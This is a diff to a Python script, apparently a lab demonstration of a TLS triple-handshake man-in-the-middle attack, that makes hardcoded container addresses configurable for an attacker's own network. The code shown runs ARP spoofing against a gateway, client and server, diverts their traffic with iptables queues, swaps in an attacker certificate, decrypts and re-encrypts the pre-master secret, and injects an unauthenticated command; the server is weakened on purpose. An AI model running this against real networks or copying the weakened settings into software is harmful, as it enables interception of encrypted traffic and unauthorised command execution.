@@ -1,6 +1,4 @@
-# This is a sample Python script.
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+
 import http.client
 import socket
 import subprocess
@@ -25,6 +23,12 @@ from scapy.main import load_layer
 from scapy.packet import Packet
 from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker, Session
 from tlslite.utils.compat import bytes_to_int
+
+IP_SERVER = "192.168.91.134" # put your server ip address
+IP_CLIENT = "192.168.91.142" # put your client ip address
+IP_GATEWAY = "192.168.91.2" # put your gateway ip address
+PORT = 443 # put your TLS port
+INTERFACE = "ens33" # put your attacker interface
 
 # We got a server and a client. The server accepts "database" commands from clients: if they are anything but drop table commands, it accepts
 # them because they are innocuous, but if they are DROP TABLE commands, it requests a certificate from the client before executing them.
@@ -326,11 +330,11 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                         scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)
 
                         # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
-                        attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
+                        attacker_certificate_der = open("attacker_server_certificate.der", "rb").read()
                         attacker_certificate_der_len = len(attacker_certificate_der)
                         print(f"attacker certificate length is {attacker_certificate_der_len}")
 
-                        server_certificate_der = open("/app/server_certificate.der", "rb").read()
+                        server_certificate_der = open("server_certificate.der", "rb").read()
                         server_certificate_der_len = len(server_certificate_der)
 
                         # since the difference in length is positive in the demo, we can just pad with zeroes... (btw, i calculated it manually using cyberchef)
@@ -432,7 +436,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                         print(encrypted_pre_master_key__client)
                         print("confirm with encrypted_pre_master_key__client string length: " + str(len(encrypted_pre_master_key__client)))
 
-                        with open("/app/RSA_key_attacker_server.pem", "rb") as key_file:
+                        with open("RSA_key_attacker_server.pem", "rb") as key_file:
                             private_key_attacker_s = serialization.load_pem_private_key(key_file.read(), password=None)
 
                         pre_master_key = private_key_attacker_s.decrypt(encrypted_pre_master_key__client, padding=PKCS1v15())
@@ -443,7 +447,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                         print("plaintext (HEX): " + pre_master_key.hex())
 
                         #reencrypt with the server's public key and send it like that...
-                        with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
+                        with open("server_certificate.pem", "rb") as pub_cert_file_server:
                             public_key_server = load_pem_x509_certificate(pub_cert_file_server.read()).public_key()
 
                         encrypted_pre_master_key__server = public_key_server.encrypt(pre_master_key, PKCS1v15())
@@ -619,7 +623,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
                 pkt.set_payload(bytes(final_packet_after_manual_insertion))
 
-            elif scpy_pkt.haslayer(TLSChangeCipherSpec) and scpy_pkt.src == "172.18.0.3": # SERVER CHANGE CIPHER AND SERVER'S Finished message!
+            elif scpy_pkt.haslayer(TLSChangeCipherSpec) and scpy_pkt.src == IP_SERVER: # SERVER CHANGE CIPHER AND SERVER'S Finished message!
                 # fourth and final stage of the handshake, got to modify the TLS server finished message and inject an unauthenticated command!
                 print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                 print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
@@ -852,8 +856,8 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
                     pkt.set_payload(bytes(final_packet_after_manual_insertion))
                     #
-                    # rst_packet_for_server = IP(dst="172.18.0.3", src="172.18.0.2")/TCP(dport=scpy_pkt[TCP].dport, sport=scpy_pkt[TCP].sport, flags='F', seq=final_packet_after_manual_insertion[TCP].seq + 1, ack=final_packet_after_manual_insertion[TCP].ack)
-                    # rst_packet_for_client = IP(dst="172.18.0.2", src="172.18.0.3")/TCP(dport=scpy_pkt[TCP].sport, sport=scpy_pkt[TCP].dport, flags='F', seq=final_packet_after_manual_insertion[TCP].ack + 1, ack=final_packet_after_manual_insertion[TCP].seq)
+                    # rst_packet_for_server = IP(dst=IP_SERVER, src=IP_CLIENT)/TCP(dport=scpy_pkt[TCP].dport, sport=scpy_pkt[TCP].sport, flags='F', seq=final_packet_after_manual_insertion[TCP].seq + 1, ack=final_packet_after_manual_insertion[TCP].ack)
+                    # rst_packet_for_client = IP(dst=IP_CLIENT, src=IP_SERVER)/TCP(dport=scpy_pkt[TCP].sport, sport=scpy_pkt[TCP].dport, flags='F', seq=final_packet_after_manual_insertion[TCP].ack + 1, ack=final_packet_after_manual_insertion[TCP].seq)
                     #
                     # rst_packet_for_client.show2()
                     # rst_packet_for_server.show2()
@@ -899,7 +903,7 @@ if __name__ == '__main__':
     if socket.gethostname() == "client":
         # try to connect via tls to server after 10s...
         print("client connected...")
-        p = subprocess.Popen(["ping", "172.18.0.3"])
+        p = subprocess.Popen(["ping", IP_SERVER])
 
         sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
         sleep(5) # give some time to the server for setup, before trying to connect...
@@ -907,7 +911,7 @@ if __name__ == '__main__':
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        sock.connect(("172.18.0.3", 443))
+        sock.connect((IP_SERVER, PORT))
         #step 2. construct a TLSConnection
         conn = tlslite.TLSConnection(sock)
         #step 3. call a handshake function (client).
@@ -915,14 +919,14 @@ if __name__ == '__main__':
         #        old router's control panels: they have https with tls, but their certificate is not installed in the machine.
         #        THe bug is to not insert a checker object in the list of arguments to handshakeclientcert.
         x509 = X509()
-        with open("/app/client_certificate.pem") as s:
+        with open("client_certificate.pem") as s:
             x509.parse(s.read())
         chain = X509CertChain([x509])
 
-        with open("/app/RSA_key_client_client.pem") as s:
+        with open("RSA_key_client_client.pem") as s:
             private_key = parsePEMKey(s.read(), private=True)
 
-        with open("/app/server_certificate.pem") as s:
+        with open("server_certificate.pem") as s:
             server_certificate = X509().parse(s.read())
 
         print(server_certificate.sigalg)
@@ -955,7 +959,7 @@ if __name__ == '__main__':
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # previous socket was closed, reopen a new one...
                         sock.settimeout(5)
                         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                        sock.connect(("172.18.0.3", 443))
+                        sock.connect((IP_SERVER, PORT))
                         conn = tlslite.TLSConnection(sock)
                         conn.handshakeClientCert(chain,
                                                  private_key,
@@ -994,7 +998,7 @@ if __name__ == '__main__':
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         # step 1s. bind the socket to our address (SERVER) and port, and start listening...
-        sock.bind(("172.18.0.3", 443))
+        sock.bind((IP_SERVER, PORT))
         sock.listen(1)
         real_sock, client_address = sock.accept() # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
         real_sock.settimeout(20)
@@ -1005,16 +1009,16 @@ if __name__ == '__main__':
         conn = tlslite.TLSConnection(real_sock)
         # step 3. call a handshake function (server).
         #        We insert voluntarily a bug here, which is to not check the client's certificate from the start
-        s = open("/app/server_certificate.pem").read()
+        s = open("server_certificate.pem").read()
         x509 = X509()
         x509.parse(s)
         chain = X509CertChain([x509])
 
-        s = open("/app/RSA_key_server_server.pem").read()
+        s = open("RSA_key_server_server.pem").read()
         private_key = parsePEMKey(s, private=True)
 
 
-        with open("/app/client_certificate.pem") as s:
+        with open("client_certificate.pem") as s:
             client_certificate = X509().parse(s.read())
 
         settings = HandshakeSettings()
@@ -1024,7 +1028,7 @@ if __name__ == '__main__':
         settings.useEncryptThenMAC = False
         settings.useExtendedMasterSecret = False  # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
                                                   # section 4 RFC 7627
-        # session cache active, so we can resume laster
+        # session cache active, so we can resume later
         sessionCache = SessionCache()
 
         auth_needed = False
@@ -1087,12 +1091,12 @@ if __name__ == '__main__':
             # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
             p = list()
             print("starting arpspoofing...")
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the server i'm the client
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the client i'm the server
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_GATEWAY, IP_CLIENT], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_CLIENT, IP_GATEWAY], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_GATEWAY, IP_SERVER], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_SERVER, IP_GATEWAY], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_SERVER, IP_CLIENT], stdout=fnull, stderr=fnull)) # tell the server i'm the client
+            p.append(subprocess.Popen(["arpspoof", "-i", INTERFACE, "-t", IP_CLIENT, IP_SERVER], stdout=fnull, stderr=fnull)) # tell the client i'm the server
             # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
             print("arpspoofing started.")
             #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
@@ -1104,10 +1108,10 @@ if __name__ == '__main__':
             print("creating iptables netfilter rules for victim and server...")
             # must capture every packet destined to the server coming from the client, ...
             p.append(subprocess.Popen(
-                ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
+                ["iptables", "-I", "FORWARD", "-s", IP_CLIENT, "-d", IP_SERVER, "-j", "NFQUEUE", "--queue-num", "1"]))
             #and every packet destined to the client coming from the server...
             p.append(subprocess.Popen(
-                ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
+                ["iptables", "-I", "FORWARD", "-s", IP_SERVER, "-d", IP_CLIENT,  "-j", "NFQUEUE", "--queue-num","1"]))
             # as they come, they will be ordered in the queue (remember, queues are FIFOs!)
             print("firewall rules created.")
 
@@ -1130,4 +1134,4 @@ if __name__ == '__main__':
             for proc in p:
                 proc.kill()
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+
